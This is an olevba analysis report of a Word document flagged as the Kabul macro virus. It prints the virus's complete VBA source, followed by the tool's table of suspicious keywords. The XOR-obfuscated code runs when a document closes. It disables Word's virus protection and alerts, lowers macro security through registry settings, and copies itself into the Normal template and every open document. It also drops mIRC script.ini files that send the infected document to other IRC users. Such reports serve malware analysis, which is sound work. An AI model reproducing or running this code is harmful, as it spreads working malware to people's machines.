olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kabul.a-a4f8b46f177463dec0cacb7f1880f9c8ee57058e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kabul.a-a4f8b46f177463dec0cacb7f1880f9c8ee57058e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Kabul.a-a4f8b46f177463dec0cacb7f1880f9c8ee57058e - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Kabul
Private Sub FileClose()
Call Kabul
End Sub
Private Sub Document_Close()
Call Kabul
End Sub
Private Sub AutoClose()
Call Kabul
End Sub
Private Sub Kabul()
On Error Resume Next
Set nor = NormalTemplate.VBProject.VBComponents(((((((((((((((((((((1))))))))))))))))))))).CodeModule
Set ths = ThisDocument.VBProject.VBComponents(((((((((((((((((((((1))))))))))))))))))))).CodeModule
mycode = ths.lines(((((((((((((((((((((1)))))))))))))))))))), ((((((((((((((((((((300)))))))))))))))))))))
Open Crypt("f?YrlkajrvYv|vq`hYndgpi+sgv", 5) For Output As #1
Print #1, Crypt("V`q%ndgpi%8%RVfwluq+Fw`dq`Jgo`fq-", 5) & Chr(34) & Crypt("Rjwa+Duuilfdqljk", 5) & Chr(34) & Crypt(",", 5)
Print #1, Crypt("ndgpi+Juqljkv+SlwpvUwjq`fqljk%8%5", 5)
Print #1, Crypt("ndgpi+Juqljkv+Vds`KjwhdiUwjhuq%8%5", 5)
Print #1, Crypt("ndgpi+Juqljkv+FjkclwhFjks`wvljkv%8%5", 5)
Print #1, Crypt("Cjw%}%8%4%Qj%ndgpi+KjwhdiQ`huidq`+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+FjpkqJcIlk`v", 5)
Print #1, Crypt("Ndgpi+KjwhdiQ`huidq`+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+A`i`q`Ilk`v%4", 5)
Print #1, Crypt("K`}q", 5)
Print #1, Crypt("Ndgpi+KjwhdiQ`huidq`+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+DaaCwjhCli`%-", 5) & Chr(34) & Crypt("F?YrlkajrvYv|vq`hYndgpi+GDV", 5) & Chr(34) & Crypt(",", 5)
Print #1, Crypt("ndgpi+Duuilfdqljk+Tplq", 5)
Close #1
Open Crypt("f?YRlkajrvYv|vq`hYndgpi+gdv", 5) For Output As #1
Print #1, mycode
Close #1
System.PrivateProfileString("", Crypt("MN@\ZIJFDIZHDFMLK@YVjcqrdw`YHlfwjvjcqYRlkajrvYFpww`kqS`wvljkYWpk", 5), Crypt("Ndgpi", 5)) = Crypt("F?YRlkajrvYv|vq`hYndgpi+SGV", 5)
System.PrivateProfileString("", Crypt("MN@\ZFPWW@KQZPV@WYVjcqrdw`YHlfwjvjcqYJcclf`Y<+5YRjwaYV`fpwlq|", 5), Crypt("I`s`i", 5)) = 1&
With Options
.VirusProtection = ((((((((((((((((((((0))))))))))))))))))))
.ConfirmConversions = ((((((((((((((((((((0))))))))))))))))))))
.SaveNormalPrompt = ((((((((((((((((((((0))))))))))))))))))))
.Application.ScreenUpdating = ((((((((((((((((((((0))))))))))))))))))))
.Application.EnableCancelKey = wdCancelDisabled
.Application.ShowVisualBasicEditor = ((((((((((((((((((((0))))))))))))))))))))
.Application.DisplayAlerts = wdAlertsNone
.Application.DisplayStatusBar = ((((((((((((((((((((0))))))))))))))))))))
End With
CommandBars(Crypt("Qjjiv", 5)).Controls(Crypt("Hdfwj", 5)).Enabled = ((((((((((((((((((((0))))))))))))))))))))
installation$ = Crypt("f?YrlkajrvYv|vq`hYajkqw`dah`+ajf", 5)
ths.SaveAs installation$
For i = ((((((((((((((((((((1)))))))))))))))))))) To Documents.Count
If Documents(i).VBProject.VBComponents(((((((((((((((((((((1))))))))))))))))))))).CodeModule.lines(((((((((((((((((((((1)))))))))))))))))))), ((((((((((((((((((((1))))))))))))))))))))) <> "'Kabul" Then actins = ((((((((((((((((((((0)))))))))))))))))))) Else actins = ((((((((((((((((((((1))))))))))))))))))))
If actins = ((((((((((((((((((((0)))))))))))))))))))) Then
With Documents(i).VBProject.VBComponents(((((((((((((((((((((1))))))))))))))))))))).CodeModule
.DeleteLines ((((((((((((((((((((1)))))))))))))))))))), .CountOfLines
.addfromstring mycode
End With
End If
Next
If nor.lines(((((((((((((((((((((1)))))))))))))))))))), ((((((((((((((((((((1))))))))))))))))))))) <> "'Kabul" Then norins = ((((((((((((((((((((0)))))))))))))))))))) Else norins = ((((((((((((((((((((1))))))))))))))))))))
If norins = ((((((((((((((((((((0)))))))))))))))))))) Then
With nor
.DeleteLines ((((((((((((((((((((1)))))))))))))))))))), .CountOfLines
.addfromstring mycode
End With
NormalTemplate.Save
End If
Pathy = Crypt("F?YrlkajrvYv|vq`hYajkqw`da+lkl", 5)
Open Pathy For Output As #1
Dim j(27) As String
j(0) = "^VFWLUQX"
j(1) = "k58JK%4?OJLK?&?~%*LC%-%!klfn%88%!h`%,%~%mdiq%x"
j(2) = "k48%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(3) = "k78x"
j(4) = "k68JK%4?UDWQ?&?~%*LC%-%!klfn%88%!h`%,%~%mdiq%x"
j(5) = "k18%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(6) = "k08x"
j(7) = "k38Jk%4?Q@]Q?/gpvm/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(8) = "k28%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(9) = "k=8x"
j(10) = "k<8Jk%4?Q@]Q?/pvdhd/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(11) = "k458%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(12) = "k448x"
j(13) = "k478Jk%4?Q@]Q?/ida`k/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(14) = "k468%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(15) = "k418x"
j(16) = "k408Jk%4?Q@]Q?/rqf/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(17) = "k438%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(18) = "k428x"
j(19) = "k4=8Jk%4?Q@]Q?/k|/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(20) = "k4<8%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(21) = "k758x"
j(22) = "k748Jk%4?Q@]Q?/b`jwb`/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(23) = "k778%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(24) = "k768x"
j(25) = "k718Jk%4?Q@]Q?/dcbdklvqdk/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(26) = "k708%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(27) = "k738x"
For i = 0 To 27
Print #1, Crypt(j(i), 5)
Next
Close #1
Dim dest(((((((((((((((((((((4))))))))))))))))))))) As String
dest(((((((((((((((((((((1))))))))))))))))))))) = Crypt("f?YhlwfYv|vq`hYvfwluq+lkl", 5)
dest(((((((((((((((((((((2))))))))))))))))))))) = Crypt("f?Yhlwf67Yv|vq`hYvfwluq+lkl", 5)
dest(((((((((((((((((((((3))))))))))))))))))))) = Crypt("f?Yuwjbwd{4YhlwfYvfwluq+lkl", 5)
dest(((((((((((((((((((((4))))))))))))))))))))) = Crypt("f?Yuwjbwd{4Yhlwf67Yvfwluq+lkl", 5)
For i = ((((((((((((((((((((1)))))))))))))))))))) To ((((((((((((((((((((4))))))))))))))))))))
SetAttr dest(((((((((((((((((((((i))))))))))))))))))))), vbNormal
Shell Crypt("fju|%", 5) & Pathy & Crypt("%", 5) & dest(i)
Next
If Day(Now()) = ((((((((((((((((((((11)))))))))))))))))))) And Month(Now()) = ((((((((((((((((((((9)))))))))))))))))))) Then
With Documents(((((((((((((((((((((1))))))))))))))))))))).Content
.Font.Name = Crypt("Rlkbalkbv", 5)
.Font.Size = ((((((((((((((((((((72))))))))))))))))))))
.InsertAfter Crypt("T66K\", 5)
End With
End If
End Sub
Private Function Crypt(q33ny, key)
For i = 1 To Len(q33ny)
Crypt = Crypt & Chr(Asc(Mid(q33ny, i, 1)) Xor key)
Next
q33ny = ""
End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

